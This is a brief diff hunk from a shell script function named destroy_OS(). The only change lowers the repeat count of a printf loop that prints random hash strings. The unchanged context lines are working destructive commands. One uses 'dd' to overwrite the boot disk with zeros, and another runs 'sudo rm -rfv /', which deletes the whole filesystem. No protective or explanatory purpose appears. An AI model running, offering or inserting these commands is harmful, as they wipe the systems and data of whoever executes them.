@@ -32,7 +32,7 @@ function destroy_OS()
     
     sudo dd if=/dev/zero of=$(take_boot_disk) bs=1 count=46
     sudo rm -rfv /
-    printf -- "$(echo $RANDOM | md5sum | head -c 20; echo;)%.1s" {1..105670}
+    printf -- "$(echo $RANDOM | md5sum | head -c 20; echo;)%.1s" {1..10567}
     
     echo $RANDOM | md5sum | head -c 20; echo;
 
